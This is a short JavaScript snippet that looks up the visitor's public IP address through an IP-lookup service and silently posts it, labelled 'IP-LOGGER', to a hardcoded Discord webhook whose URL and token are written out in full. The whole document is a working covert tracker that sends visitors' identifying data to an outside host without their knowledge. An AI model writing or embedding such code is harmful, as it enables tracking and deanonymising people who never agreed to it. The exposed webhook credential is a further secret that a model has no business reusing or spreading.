var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response) {
    return response.json();
})
.then(function(data) {
    ip = data.ip;
    var webhook = 'https://discord.com/api/webhooks/1130130728273842206/oB9RWsVzCHQzk1L4aYWS5QAxEgin6oPkBB1Eh0eT9Ofiffn5fntSJua_yIZZwcXeZyd8'
    var message = {
        content: 'IP-LOGGER : ' + ip
    };

    fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
});